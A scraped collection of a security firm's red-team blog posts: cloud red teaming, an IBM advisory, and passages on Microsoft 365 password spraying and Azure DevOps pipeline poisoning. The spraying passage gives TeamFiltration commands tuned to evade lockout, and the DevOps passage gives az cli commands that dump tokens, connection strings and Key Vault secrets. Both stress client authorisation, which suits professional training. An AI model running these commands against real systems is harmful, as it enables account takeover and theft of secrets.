for maintaining it.","introduction#Introduction":"","key-features#Key Features":"","reporting#Reporting":"Finally, we mentioned that we leverage the charts and graphics implemented in VECTR. The data and information logged in your test cases can be easily converted into visual representations of the security estate. We have found this to be especially useful when presenting to executive or non-technical audiences.\nimage1 A pie chart generated off the test cases carried out and their result. ","setup-and-backup#Setup and Backup":"","what-is-vectr#What is VECTR?":""},"title":"VECTR for Purple Team Engagements"},"/articles/2023/12/2023-12-19-red-teaming-the-cloud-a-shift-in-perspective/":{"data":{"":"Introduction\nCloud adoption is exploding, and rightfully so. Businesses are seeing the value of improved agility and efficiency when leveraging public cloud, resulting in 60% of all corporate data globally being stored in the cloud in 2022. As such, securing the cloud is becoming an increasingly important skill for defensive security teams, ergo red teaming the cloud is becoming increasingly important for us offensive security teams too.\nWhilst on-premise red teaming is a rich, documented and well-understood topic, cloud red teaming is still in its infancy. This blog post will highlight some of the biggest differences between on-premise and cloud red teaming, and how red teamers must shift their perspective in the newest security frontier: the cloud. Initial Compromise\nOne element that remains the same from on-premise to the cloud is that almost all attack paths start with the initial compromise of ‘something’ in the target environment. In fact, that ‘something’ remains largely unchanged: staff members, externally facing assets and exposed data. The first major difference is the end-goal after having achieved this initial compromise: whilst traditional red teaming would see you introduce malware, such as a C2 implant in most cases, cloud red teaming often focuses on obtaining a target’s access tokens or credentials. Access ‘tokens’ in Azure or ‘keys’ in AWS both serve the purpose of allowing remote attackers to begin interacting with the cloud estate via portals or APIs, which is where much of the battle will be fought. Whilst this can indeed be obtained through remote code execution (RCE) on a machine in most cases, there are alternative (usually easier) methods such as google dorking for leaked keys or social engineering targeting authentication flows.\nGetting to your goal\nIn traditional on-premise environments, attackers seek to obtain credentials and exploit vulnerabilities to move laterally and escalate privileges within the local network. Lateral movement and privilege escalation often involves techniques like credential dumping, exploiting misconfigurations and taking control of increasingly privileged machines and user accounts. Persistence often involves the deployment of malware and mechanisms to keep them alive. In cloud environments, the focus shifts towards the compromise of identities, which means attackers primarily aim to compromise user accounts or service principal identities in the target tenant. Many traditional on-premise attack vectors that rely on local network access are not applicable in cloud red teaming scenarios.\nIn this case, privilege escalation and persistence can be achieved by compromising other cloud-based identities and their associated permissions. In our experience, whilst many traditional on-premise attack paths require obtaining ‘superuser’ (namely domain administrator) permissions, this is not as often the case in the cloud. We believe this is due to the complexity of, and thereby lack of familiarity with, cloud-based access control permissions leading to access control gaps arising more often. With vendors rightfully advertising least privilege and zero-trust architectures, roles can be assigned with far more granularity. However, with granularity comes greater complexity and administrators sometimes (often) refrain from diving into the documentation to truly understand the permissions needed, resulting in overly permissive accounts.\nCrucially, one of the biggest differences between on-premise and cloud here is that we are typically looking to abuse default configurations or ‘abuse primitives’, as opposed to finding exploits in the cloud platform. The many reasons why this is the case is beyond the scope of this blog post, but an incredibly interesting topic for discussion. Finally, internal phishing using cloud services is often used to gain elevated privileges and, in our experience, used much more often than in on-premise engagements.\nMining for Data\nData gathering is crucial and still prevalent in both on-premise and cloud engagements. However, the places and the means change substantially. File storage and database servers that were previously secured behind a corporate firewall may now be left exposed due to misconfigurations, resulting in an accidental reliance on ‘security through obscurity’ for business-critical assets and data. Attackers who have phished the right user account may end up connecting to cloud resources from anywhere in the world. Gone are the days when a VPN connection was necessary to reach critical internal resources, as cloud platforms expose their logins and APIs publicly. With a single authentication to cloud platforms an adversary has a foothold in the target cloud environment and all its offerings.\nIn response to the evolving landscape of data storage, exchange and security, new methods for extracting sensitive data are emerging. Attackers are increasingly abusing vendor APIs for reconnaissance purposes, as exemplified by the Microsoft Graph API. Only recently we were made aware of a technique using text-to-speech immersive reading features to retrieve and ‘read out’ credential material you should not have access to! Yet again this shows how common features can be exploited, and underscores the need for heightened vigilance in this space. Additionally, we have seen Artificial Intelligence (AI) being trained on the target’s internal blueprints, documents, email exchanges and instant messaging logs to make informed decisions about potential targets within an organisation, whether they are humans, or machines. This raises concerns about the evolving sophistication of cyberattacks and the need to stay ahead as red teamers.\nConclusion\nThe cloud’s shared responsibility model has changed the security landscape, as customers cannot assess the security of the systems hosting their data from the ground-up anymore. In many cases, cloud providers leave them to develop the knowledge required to be able to securely administer cloud services, and by doing so open the door for myriad cloud misconfigurations.\nAs we at JUMPSEC gain more experience with cloud red teaming we have come to appreciate the major, and minor, shifts in perspective that are necessary when targeting cloud environments. Gone are the days of being highly exploit-centric red teamers, when the success in cloud environments can, in large part, come down to the understanding and abuse of cloud configurations and functionality. Whilst ‘popping shells’ will never lose its novelty, it is often less impactful than going after key identities within the cloud environment. However, what really excites us is the knowledge that there remains so much to explore and evolve in cloud red teaming. It is for this reason that we are dedicating so much time and energy to stay ahead in this burgeoning area of offensive security."},"title":"Red Teaming the Cloud: A Shift in Perspective"},"/articles/2023/12/2023-12-21-advisory-cve-2023-43042-ibm-backup-products-superuser-information-disclosure/":{"data":{"":"Software: IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem and IBM Storage Virtualize products\nAffected versions: 8.3\nVendor page: https://www.ibm.com/support/pages/node/7064976\nCVE Reference: CVE-2023-43042\nPublished: 08/12/2023\nCVSS 3.0 Score: 7.5 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\nAttack Vector: Network\nCredit: Max Corbridge\nSummary\nJUMPSEC’s Head of Adversarial Simulation (@CorbridgeMax) discovered that an unauthenticated user can determine whether the default superuser password has been changed on IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem and IBM Storage Virtualize products. These products were found to be a single point of failure for backup and disaster recovery processes within client environments, and as such are highly critical systems. This only affects the 8.3.1 release as it is impossible for the default password to still be configured on an active system running later releases, since the user must change this either as part of first time setup or prior to upgrading from 8.3.1 or earlier. However, IBM has removed the ability to query this status from all releases listed in the Mitigation section of this advisory.\nTechnical details\nIBM web servers related to backup/storage products respond to unauthenticated GET requests to the /login page with the name of the superuser account and if the default password has been changed or not. This could allow unauthenticated attackers on the network with the necessary information to compromise what is often a business-critical asset, with superuser permissions. HTTP/1.1 200 Cache-Control: no-cache, no-store, must-revalidate Strict-Transport-Security: max-age=778000; includeSubDomains X-FRAME-OPTIONS: SAMEORIGIN X-XSS-Protection: 1; mode=block Referrer-Policy: no-referrer-when-downgrade Pragma: no-cache X-Content-Type-Options: nosniff SET-COOKIE: JSESSIONID=[REDACTED];Path=/;Secure;SameSite=Lax SET-COOKIE: _sync=[REDACTED];Path=/;Secure;SameSite=Strict SET-COOKIE: _redirect=[REDACTED];Path=/;Secure;SameSite=Strict SET-COOKIE: _sync=[REDACTED]; HttpOnly; Secure X-FRAME-OPTIONS: DENY Cache-Control: post-check=0, pre-check=0 vary: accept-encoding Content-Type: text/html;charset=UTF-8 Content-Language: en-US Date: Fri, 08 Sep 2023 12:28:27 GMT Connection: close Content-Length: 70858 \u003c!DOCTYPE html\u003e \u003chtml\u003e [SNIPPED_FOR_BREVITY] \"superuserPasswordChanged\":true,\"hasEnvironmentals\":true, [SNIPPED_FOR_BREVITY] \u003c/body\u003e \u003c/html\u003e Figure 1: HTTP Response from IBM FlashSystem Webserver\nMitigation\nAs a priority, change the superuser password if it is still set to the default.\nIBM also recommends that you fix this vulnerability by upgrading affected versions of IBM SAN Volume Controller, IBM Storwize V7000, IBM Storwize V5000 and V5100, IBM Storwize V5000E, IBM Spectrum Virtualize Software, IBM Spectrum Virtualize for Public Cloud, IBM FlashSystem V9000, IBM FlashSystem 9500, IBM FlashSystem 9100 Family, IBM FlashSystem 9200, IBM FlashSystem 7300, IBM FlashSystem 7200, IBM FlashSystem 5200 and IBM FlashSystem 5000 to the following code levels or higher:\n8.6.2.0\n8.6.0.2\n8.5.0.10\n8.4.0.12\n8.3.1.10\nPlease note that it is necessary to change the superuser password before upgrading from 8.3.1 to 8.4.0 or later, which is the reason why this upgrade remediates the vulnerability.\nTimeline\n08/09/2023: Vulnerability submitted through IBM’s Vulnerability Disclosure Program\n13/12/2023: Vulnerability remediated and public notice created by IBM."},"title":"\u003cstrong\u003eAdvisory CVE-2023-43042 – IBM Backup Products Superuser Information Disclosure\u003c/strong\u003e"},"/articles/2024/05/2024-05-02-why-sneak-when-you-can-walk-through-the-front-door/":{"data":{"":"","caveats--disclaimers#Caveats \u0026amp; Disclaimers":"In 2023 through 2024, JUMPSEC’s red team gained access to Microsft 365 (M365) environments of sophisticated clients during adversarial engagements with an approach that breathes life into the decades-old technique of password spraying. With threat actors increasingly using similar approaches in the wild, being able to compromise the even likes of Microsoft themselves, it is my opinion that red teams might benefit from incorporating some of these techniques into their initial access arsenal, or even in external perimeter security testing, to better emulate adversaries and challenge assumptions around intial access.\nCredit Full credit needs to be given to developers of the tools and authors of the following blog posts who kindly shared their ideas. This post is heavily inspired by the work of:\nTeamfiltration v 3.5.3, initial v1 released in DEFCON 2022 - Credits to Flangvik @ TrustedSec Fireprox, initial release in 2019 - Credits to ustrayready @ Black Hills InfoSec Graphrunner, initial release in Oct 2023 - Credits to dafthack @ Black Hills InfoSec Why M365? Historically, Outlook accounts were merely email inboxes with impactful but limited usability, but this is no longer the case. Barring the capacity to read sensitive businesss communications and impersonate internal users to phish others in an organisation, an attacker’s access to M365 accounts often lead to far more impact in hybrid or cloud-native organisations in 2024.\nFor example, we have multiple clients where most if not all of their business critical data now resides in SharePoint and access control is tied to M365/Azure groups. An attacker compromising an account with SharePoint access is analogous to getting access to the data of an internal file server in a traditional on-prem context. Let’s say said account has read/write access to multiple business-critical SharePoint sites, then they are already analogous to being able to “deploy ransomware” in a traditional sense, if proper recovery procedures have not been implemented.\nIn addition, an active M365 session grants access to GraphAPI and other Microsoft cloud resources, which is a fantastic entrypoint for lateral movement and persistence in the cloud. I do encourage checking out Black Hill’s incredible blog post on the subject of Azure / GraphAPI lateral movement with GraphRunner if you are interested.\nThe Theory Behind User’s gonna user So, given M365 accounts are juicy targets, how does one gain access? Besides MiTM phishing with tools like Evilginx, consider spraying your way in. The term “password spraying” refers to trying a small set of passwords (usually less than 20, or even 10 in this context) against a large number (hundreds, or more if possible) of users.\nThe core idea is that even in an org with a “strong” password policy in length and complexity, some users are statistically likely to set easily guessable ones like Welcome@2024. If an attacker can gather a large number of valid user emails (out of scope of this blog post, but there are many resources for this), they only need to target the statistically common passwords to get the highest chance to find a correct combination.\nAs a side note, Welcome@YYYY, Season@YYYY, WelcomeYYYY!, Orgname@YYYY appear to be some of the highest hit rate passwords we observed in engagements.\nWhile this is all well and good, there are 2 minor inconveniences in most modern OAuth providers in the forms of:\nintruder identification \u0026 blocking, and; user lockout. Since we are targeting M365, we’ll discuss Microsoft’s implementation, Entra Smart Lockout, which might surprise you.\nEntra Smart Lockout According to this MS announcement, Smart Lockout is included in all versions of Azure AD (now called Entra ID, probably a different name in 2025?) including implementations in Office365, by default. Customisatiion of Smart Lockout settings requires Microsoft Entra ID P1 license or above (Licenses below P1 are stuck with default settings but Smark Lockout is still enabled). Therefore, all M365 corporate clients you encounter should have this feature turned on, and the only variation to expected would be the lockout settings.\nThe default settings are as the following:\n(For non-US government tenants): an account is locked after 10 failed attempts. The account locks again after each subsequent failed sign-in attempt. Lockout period is one minute at first, and longer in subsequent attempts. Microsoft does not disclose the rate at which the lockout period increases after unsuccessful sign-in attempts. You might be thinking, where’s the smart in this, seems to merely be an incremental lockout timer, no? Here’s the smart part:\nWhen smart lockout locks a user account, we try our best to not lock out the genuine user. To ensure that bad actors can’t gain access to a genuine user account. The following considerations apply:\nFamiliar vs unfamiliar locations are used to differentiate between a bad actor and the genuine user. They have separate lockout counters. Once an account is locked out, the lockout state is synchronised across all Microsoft Entra data centers. After an account lockout, the user can initiate self-service password reset (SSPR) to sign in again. And there’s the fine print at the end:\nIn addition to Smart lockout, our default protection analyses and identifies other signals including IP traffic and anomalous behavior. Entra ID blocks these malicious sign-ins by default and returns AADSTS50053 - IdsLocked error code, regardless of the password validity.\nTL;DR as in, sorry I didn’t read the Doc From the Microsoft Documentations we can infer a few things:\nWe need to bypass the lockout timer by spacing out attempts. If attempts for the same user are sufficiently spaced out, the lockout timer (meaning, you won’t get in even with a correct password) might not hit you, the attacker. The attempts should come from different IP addresses, with minimal behavioral patterns that can be identified by Microsoft’s algos. Unfortunately, unless our attempts come from the same city or region that the user usually logs into, their daily work routine would not reset our “unfamiliar” lockout counter. The AADESTS50053 error can either mean Smart Lockout kicking in, locking the user account, or default protection. Nevertheless, it means we won’t get in with the correct password. That being said, MS have an undisclosed internal timer that would reset in the latter case, or the user can unlock themselves via SSPR, so it might not be the end of the world when you see this error. As said, if SSPR is on, users can unlock themselves, resulting in less disruption to the client. It is not a “get out of jail free” card though, as locking a single account may be extremely impactful if it’s the wrong one. We cannot overstate the importance of getting a good understanding of offensive toolings that you’re using, and having clear and open communcations with your client regarding some of these more “risky” tradecraft. Fireprox While APT Midnight Blizzard was reported obtain intial access on Microsoft using distributed residential proxies to perform password spraying, red teamers can achieve a similar result by utilising the AWS API gateway service, which can (by design) serve as a proxied gateway to … API services (duh). Fireprox is a tool that creates a wrapper around the usage of this service to create a “distributed” proxy to send POST requests to login.microsoftonline.com. The next tool introduced in this blog post, Teamfiltration, also incorporates code from Fireprox in its codebase, so if you want to follow along, make sure to sort out the AWS pre-requisites here. You’d need:\nAn AWS tenant that you control. Create a new IAM user, grant them AmazonAPIGatewayAdministrator privileges by attaching the policy directly in permissions. Create an access key in “Security credentials”, choose “other”, and save the access key ID and secret key somewhere safe. (Optionally) Play with Fireprox to figure out what it does. Basically, how Fireprox works is that you generate a static AWS URL to access an endpoint through AWS’s proxy. What makes it interesting is that a different egress IP address is used whenever a new request is made through that generated URL.\nFor example, here we created a URL starting with “hudi24ri47” that is located in the region of us-east-1, and the target is ifconfig.me. By curl-ing repeatedly, we can see the egress IP observed by the target web server is different in every single request.\npic2 pic1 If you are concerned about costs, API gateway is billed at 100k+ API calls for single digit dollars, so volume generated from engagements, which are usually around 10k requests, never amounted to more than a couple of pennies for us.\nObviously Microsoft would see that the logins come from AWS IP addresses, but that alone has not been enough to trigger lockouts. There are also AWS specific headers that are forwarded or added by the proxy, most importantly the X-Amz-Forwarded-For header which is removed by Fireprox. You can easily verify this by using your own request catcher and curl with Fireprox and compare the requests received with those sent from vanilla API gateway proxies.\nCaveats \u0026 Disclaimers Before we discuss the actual tradecraft, do note that you should seek explicit consent from your client before starting any password spraying, and preferrably start from a small user set to minimize disruption. Even if users can self-serve reset their password to unlock their accounts, locking up dozens or even hundreds of accounts, especially without your client’s prior knowledge and consent, is professionally unacceptable and the sort of thing that red teamers should avoid at all cost.\nTo be absolutely certain about your methodology, spin up your own free (1 month trial) M365 tenant with a number of users to test your methodology before using it on real engagements, as Smart Lockout is enabled by default for all M365 tenants. In fact, when our own red team first dipped our toes into learning this, we started slow and with a lot of anxiety, even with this knowledge and clear communications with our clients. It was over the process of several engagements that we’ve learned in depth about how the tooling worked, the thresholds, and so on, that we are finally comfortable recommending it. Bear in mind that locking out accounts on engagements is no laughing matter, and that there is an expectation of professionalism from clients when they purchase a red team.\nAnother thing to recommend is to have clear communications with the client regarding what hours the password spraying occur, as some clients do not want out-of-hour password spraying. A spray in our engagements usually takes 2-3 days to complete with Teamfiltration, depending how many passwords/users we can/want to try. Fortunately it can be paused and restarted at any point.\nNeedless to say, you are responsible for your own actions.\nBarging in with Teamfiltration With the caveats out of the way, let’s dive in. While I write about Teamfiltration here, it is not the only tool for the job, though it is a very fine tool. Think of it as a many-in-one tool kit with user enumeration and data exfiltration, not just password spraying. If you just want password spraying with integration of AWS API gateway proxying (most of the below implemented that through Fireprox), there are a number of alternatives too:\nCredMaster o365spray Go365 spraycharles And if you understand the concepts behind Smart Lockout, and maybe have had a read at the source code of Fireprox, it shouldn’t be too hard to implement a sprayer from scratch yourself. If you do want to write one, this reference on M365 login error messages would be a must-read in my opinion.","credit#Credit":"","final-word#Final word":"All in all, distributed and low-volume password spraying, paired with MFA gap bruteforcing, is a valid and powerful approach for M365 initial access. While it is not expected to get you in for 100% of your clients engagements (For example, some clients have few users, and implement air-tight MFA on all of them. In those cases, social engineering would be a better bet), the approach described would be a valuable addition to most red team’s toolkit, especially if the bad guys are using it effectively already.","setting-the-tool-up#Setting the tool up":"Teamfiltration’s author Flangvik’s own Youtube playlist on the its usage is a great reference on how to set up and use the tool. I’d still go through the setup briefly here. Teamfiltration is designed around red team engagements and so it stores the information (valid usernames, credentials, password spray log, etc) in a local database, because you wouldn’t want to mix the sensitive details of Bank A and Retail Chain B, for example. The tool is designed for a sequential workflow of using --enum to find valid users, --spray to find valid username:password pair, and then --exfil to loot. The reason I go into this is that there is a little quirk of Teamfiltration – the --spray module does not seem to have -user flag (yet?) as it reads the validated users from the local database from prior runs of --enum which would confuse the heck out of operators who don’t know this.\nBeside each of your clients having their own local database, there is also the Teamfiltration profile, which is a json file that you supply to the tool everytime you run it. From an Opsec perspective it does not seem to matter much regarding client segregation, though it offers you a way to further tweak settings inbetween jobs to cater to your needs.\nThere are a number of optional inputs in a profile. At a minimum you need to supply:\nA set of sacrificial O365 user credentials: The user needs to be in an Azure / M365 tenant. A private MSDN / Outlook / Live account would not work. Reason behind this is that user enum works by searching for a supplied email through Teams, much like how one would message an external org tenant. This functionality doesn’t work with accounts not associated with a tenant. Though it is called “sacrificial” it is simply used to look people up on Teams. AWS access and secret keys to the API gateway IAM account previously described. Using Teams to enumerate users is approach the author recommended, but there are other available methods, such as the --validate-msol option which uses the GetCredentialType method and is slower. A nuance we found during our testing was that some accounts (for example, service accounts) indeed do not have a Teams license but would instead only show up on --validate-msol. On the other hand --validate-login triggers logins to check, is extremely loud and is not recommended.\nFor all the other profile options, you can just copy from the Github repo’s template. “Proxy” here refers to a local/remote web proxy for debugging purposes only, for example 127.0.0.1:8080 shown here is the one commonly used by BurpSuite. It is completely optional.\n{ \"pushoverAppKey\": \"\", \"pushoverUserKey\": \"\", \"dehashedEmail\" : \"\", \"dehashedApiKey\": \"\", \"sacrificialO365Username\": \"tfsacrificialuser1@domain.org\", \"sacrificialO365Passwords\": \"RANDOM123\" , \"proxyEndpoint\": \"http://127.0.0.1:8080\", \"AWSAccessKey\": \"CHANGEME\", \"AWSSecretKey\": \"CHANGEME\", \"UserAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)...\", \"AwsRegions\":[\"us-east-1\", \"us-west-1\", \"us-west-2\", \"ca-central-1\",...] } User Enumeration Refer to Flangvik’s video on nuances in enumerating users with Teamfiltration, but the base options with --validate-teams worked well for us:\n~/tools/TeamFiltration --config ./TFconfig_client.json --enum --usernames ./names.txt --validate-teams --outpath ./TF --outpath ~/clientA/TF - this means the results of the enumeration is saved in a database file in the stated path, which the subsequent steps would use.\npic5 User enum in action on an engagement.\nPassword Spraying ~/tools/TeamFiltration --config ./TFconfig.json --outpath ./TF --spray --sleep-min 75 --sleep-max 90 --jitter 10 --shuffle-users --shuffle-regions --exclude exclude.txt --common-only pic6 As previously explained, our goal is to not trigger Smart Lockout so that a correct credential set would get us either “Access Granted” or “MFA required” returns messages, instead of the AADESTS50053 idslocked error message. What has been found to work for us are these settings:\n--shuffle-regions:\nThis seemed to be the most important, as you can see TF creates roughly 10 Fireprox endpoints in the regions you defined in the TF profile. By shuffling regions, each request comes from a different AWS georegion and the sequence is also shuffled. --shuffle users is to change the sequence of users being sprayed. It did not seem to affect detection but I like to keep it on too.\n--sleep-min\nand --sleep-max: It is also critical to space out your spraying rounds as this defines the min/max time interval (in minutes) between which each user is attempted again. The time is randomised a bit between the 2 values to not look regular to MS. Somewhere around 1 hour per round worked for us.\n--jitter:\nit defines the time (in seconds) within one round, between trying a password against any 2 users. Against there is some randomised variability to not look like a bot to MS.\n--exclude:\nThe AADESTS50053 idslocked error message is something expected to appear in a small % of users (up to 5 or even 10%), even in the first spraying round. You can try to exclude these users in subsequent rounds, or not. Sometimes AADESTS50053 locked user(s) are observed to unlock on subsequent rounds so it’s not the end of the world as long as the % remains small and the client is in the loop of your actions.\n--common-only\nTries the “commonly observed” passwords the author defined in the source code. Of course you can use your own but these are quite good actually.\nLet’s say your spraying went well and you found valid credentials, then you would be given the choice by the tool to either --exfil to loot right away, or do it later. I would recommend to do it right away, unless there is a compelling reason not to.\npic7 You can also see all the valid credentials you found in prior spraying in the tool.\nWait, what about MFA? One reason why password spraying is performed less commonly by security testers against M365 might be the prevalence of multi-factor authentication (MFA), particularly in more mature or regulated clients. At least that was my assumption when learning about all these approaches.\nI thought, why password spray an MFA-enabled client? At worst you’re going to alert the defenders and at best you can prove that MFA was working as intended to protect people who had weak passwords.\nSuch was my assumption. What I learned later was that implementing MFA in M365 was not as simple as flipping a switch. Often times, accounts can have missing MFA requirements, for any number of reasons:\nApplication / service accounts that does not support MFA usage. New starter who have not gotten their company device to set up MFA on, or Leaver accounts not deactivated, from a time when the org haven’t implemented MFA yet. Legacy applications using M365 OAuth that the business needs, but does not support MFA. and so on. So after you have found a set of valid credentials on Teamfiltration (congrats btw), you can either interactively choose to exfil immediately or hit --exfil later to loot. What TF then does is to enumerate all the known platforms and applications with those credentials and see if there are any holes in the MFA implementation.\n~/tools/TeamFiltration --config ./TFconfig.json --outpath ./TF --exfil --all --roadtools ./TF/.roadtools_auth For example, the tool would try trying:\nWindows PC - MS Teams - invalid Mac - MS Teams - invalid iPhone - MS Teams - invalid Android - MS Teams - invalid ... Windows PC - Outlook - invalid Mac - Outlook - MFA Hole found! ... When a hole is discovered, the tool goes in, grabs the relevant access and refresh tokens that can possibly be obtained, and then exfiltrates emails, Teams chat log, Sharepoint files and so on. You could also export the tokens to be used in other tools like Roadtools or GraphRunner.\nTools such as MFASweep does a very similar MFA enumeration to look for an implementation gap, given valid set(s) credentials, for various Microsoft services and platoform combinations.\nOpsec Concerns \u0026 Post Exploitation Being stealthy is crucial for many of us red teamers, so it is reasonable to ask the question of, how loud is sending thousands of login request to a single M365 tenant? The good (and bad) news is, as of 2024, spraying low and slow (as described above) can get past Entra Smart Lockout, and even if there are a couple of AADESTS50053 idslocked errors along the way, the attack itself does not produce a “singular” We are under attack from a password spray alert under either MS’s Entra ID protection or Defender for M356 by default. The repeated login attempts do appear in the logs if blue team is looking for it, but before you find any valid credentials, you should still be under the radar unless the client has custom detection rules (perhaps, \u003e1k per day failed login attempts for the whole organisation?).\nThe second point is more open for discussion, even if the defenders figured out they are under some sort of distributed password spraying attack geolocated around the world, while this might heighten the alertness of the team, there seem to be little that can be done at the moment. A caveat is that as Microsoft themselves were compromised by a distributed password spraying attack, I would not be surprised if they do something soon-ish, but we shall see.\nQuoting Nikhil Mittal, a renowned voice in our community, “the loudest action you can perform with Azure or M365 in general, is authentication.”\nWhere you could quite reliably get an alert is when a set of valid credentials are found are used authenticate to perform the post-exploitation steps. So far, the only activity that can be used to verify credentials is using them to login, so the notification on our tooling that “valid creds are found” should also be treated as alert T+0.\nThat is the reason why I recommended running the --exfil, or performing other post-exploitation actions as soon as you find any set of valid credentials. If the blue team caught on and got the user to reset their password, your hard work so far would have been for naught. On the other hand, our experience with Teamfiltration so far has been that, it takes typically minutes to download thousands of business emails, Team chat logs and hundreds of MiBs of Sharepoint data, so it is definitely worthwhile to do that first for proving impact upfront.\nDo you have a game plan? Another generic recommendation is to have a generic post-exploitation plan before starting the password spray. It can any of the below:\nPrepared internal phishing email \u0026 payload that you can hit send right away. Token-craft - figure out what post-ex tools need what sort of access and/or refresh tokens, and how to get \u0026 use them. Organisational Persistence with inviting your own M365 users into the client’s org as guests, and registering your malicious Enterprise application to retain access even if the compromised user’s been burned. GraphRunner is an incredible post-exploitation toolkit for these. ","the-theory-behind#The Theory Behind":"","why-m365#Why M365?":""},"title":"Why sneak when you can walk through the front door - A Love letter to Password Spraying against M365 in Red Team Engagements"},"/articles/2024/05/2024-05-09-poisoning-pipelines-azure-devops-edition/":{"data":{"":"","#":" pipelinebursting2 Introduction In the ever-evolving realm of cloud services, organisations are ditching the headaches of physical infrastructure management and diving headfirst into the possibilities of cloud platforms. From the humble beginnings of deploying virtual machines and servers, we now find ourselves in a dynamic space with everything from serverless architectures to cloud-based active directories, seamless SaaS integrations, architectural blueprints, collaboration tools, AI assistants, and more.\nHowever, one core business service has been housed in the cloud longer than most: Continuous Integration / Continuous Deployment (CI/CD). The reasons are clear: there is no better use case for high availability containerised and serverless operations than a CI/CD pipeline.\nFrom a red teamer’s perspective CI/CD pipelines are also extremely valuable targets as they often underpin the production code base that, in most cases, underpins the organisation’s core business function itself. As such, many of the cloud-native red team engagements that we deliver will focus on the compromise of the CI/CD as one of the engagement objectives.\nThis blog summarises some of our thinking with regards to compromising DevOps pipelines on your red team engagements. For now we will be focusing on Azure DevOps due to the fact that historically the majority of our work has been in Azure environments, but we are seeing more and more AWS and GCP estates now too so we may release future versions of this. That being said, the philosophy behind compromising CI/CD and attack scenarios mentioned in this article are common across the board.\nAzure DevWho? Azure DevOps is a Microsoft toolkit running in the cloud, aimed at streamlining the process of creating software using a CI/CD model. It bundles services for tracking work, managing code, automating builds and tests, and sharing software packages. But more importantly, it runs user-defined code.\nInitial Foothold Once a foothold in the cloud tenant has been established via phishing, compromising an external application or assumed breach, the standard cyber kill-chain can be followed to enumerate services, move laterally, escalate privileges and mine data.\nYour favourite cloud killchain diagram Using tools like Road Tools, AzureHound, msportals.io and the Azure CLI you may begin the discovery process to identify what services are in use. Crucially, keep your eyes open for DevOps services.\nmsportals.io - you can look up any microsoft portal from here You may find that in some cases that permissions to Azure DevOps are not as locked down as you might expect. This is ultimately due to how complex granular IAM permissions can become in larger cloud estates. For example, we have found lower privileged users had write permissions to certain non-production pipelines despite not being in technical roles.\nBut…Least Privilege? Although not part of their day-to-day tasks, users that are not strictly developers may still present no restrictions in modifying, creating, deploying and executing code within the Azure DevOps pipeline. This behaviour is often not intentional but the result of overlooked permission assignments. In fact, over privileged IAM assignments is something that we regularly see in cloud environments due to the sheer number of IAM roles available. Critical permissions such as these are often overlooked, leading to users having the capability to read historical code commits, sometimes going back a few years! These can be a treasure trove for us red teamers as security may have been less of a priority back then and you may be more likely to find hardcoded credentials in older code.\nIf you find yourself having successfully phished a member of staff that has access to Azure DevOps, review the permissions that users have to DevOps services offered by Azure. Your first thoughts at this stage should be to check whether you can:\nedit repositories read history of commits (a treasure trove, believe me) or previously pushed code repositories enumerate other Azure services the organisation is using steal service accounts or managed identities associated with the DevOps service possibly introduce malware to the pipeline to enable more lateral movement and privilege escalation techniques Pipeline Runners Code checking agents are regularly used in CI/CD pipelines as part of the build process to ensure that the supplied code is running correctly and works as intended. They are compute resources with agent software installed that run tests on your code. They ensure that the infrastructure, resources, and dependencies required to run your code are present. Crucially, they can be seen as ephemeral virtual machines from the attacker perspective.\nIf you find yourself in a position where you can push code to a pipeline, you are now in a position to poison it. Remember, pipeline running agents execute arbitrary user-supplied code. That smells like RCE to me! Note, pushing arbitrary code to operational pipelines is not the play here. Instead, try to create your own branch or look for test branches. Always clear this with the client before proceeding! It’s important that we stress this point because at this stage you will need to proceed with extra caution as you may be interfering with production services. So please, if you are on an engagement, ensure you gain the right authorisation from the target organisation before proceeding with creating branches or applying changes to the pipeline environment.\n⚠️ always ensure you gain the right authorisation from the target organisation before proceeding with creating branches or applying changes to the pipeline environment\nWhere you go from here is limited only by your creativity. In our case, we use these RCEs to reach out to attacker-controlled infrastructure and pull down a C2 implant suitable for the target architecture. As a bonus, these machines rarely have security products on them as they are ephemeral by nature (we’ll get to how to maintain persistent access to these machines later)\nNow this may start to feel more like a traditional red team, but unlike a traditional red team your focus should be on compromising the identity of that agent. That is to say, you can try to steal the pipeline agent’s identity used by Azure, or any other cloud provider for that matter. These will often have service principal identities associated with them in Azure to perform actions.\nSome options with regards to stealing the tokens include:\nRequesting the tokens using az cli (from the perspective of the code agent). Metadata service Environment variables The above can be achieved by either entering the code in the code commit or by obtaining a reverse shell from the ephemeral virtual environment used by the code running agent.\nHaving now compromised that service principal, it should be easy to review whether they have read/write permissions over other services in Azure resource manager (ARM).\nTo summarise, if you can write to the repository code that is run by the code running agents, you can leverage the agent’s service principal identity to enumerate resources within the Azure environment as them, and mostly undetected.\nIf this works, it would effectively mean pivoting from your initial Azure user identity to a service principal identity for lateral movement.\nNow what do you do? Well, below we will explore different options here such as automating the process of discovering assets like storage accounts, keyvaults, CosmosDB databases, and so on.\nThe path to El-Dorado Having now compromised the identity associated with a code checking agent you can start looking for ways to escalate privileges, move laterally or demonstrate business impact. My favourite approach would be to steal credentials and connection strings to find a route to more business critical environments.\nIn previous engagements we have used this to retrieve:\nAccess and Refresh Tokens. Environmental variables belonging to the code build running agent. Storage Account connection strings. CosmosDB and Mongo databases and their connection strings. Keyvaults and the secrets they stored. Wondering what this might look like in real terms? The following are some code examples:\nEnumerate the service principal account and fetch tokens. az account list echo \"----Collecting Tokens-----\" echo token az account get-access-token echo aadgraphtoken az account get-access-token --resource-type aad-graph echo armtoken az account get-access-token --resource-type arm echo batchtoken az account get-access-token --resource-type batch echo datalake token az account get-access-token --resource-type data-lake echo ms-graphtoken az account get-access-token --resource-type ms-graph And the above list can continue with pretty much any Azure cloud enumeration command you can think of afterwards…obviously, you can also install new tools and execute them in this context.\nIterate through resources to fetch their connection strings to be used with Azure Storage Explorer or Azure Data Studio. # Ensure you install jq with sudo apt install jq -y # Find storage accounts az storage account list | jq \".[].name\" | awk \"{print $1}\" | xargs -I % sh -c \"{ az storage account show-connection-string -n %; sleep 7;}\" | jq \".connectionString\" #Find cosmosdb az cosmosdb list | jq \".[].name\" | awk \"{print $1}\" | xargs -I % sh -c \"{ az cosmosdb list-connection-strings -n % --resource-group ; sleep 7;}\" | jq \".connectionString\" Enumerate and fetch secrets from keyvaults. # Show secrets names az keyvault secret list --include-managed --vault-name \"vault-name\" --maxresults 25 # Show secrets'secret values :) az keyvault secret show --vault-name vault-name --name \"secrets-name\" | jq '.value' | tr 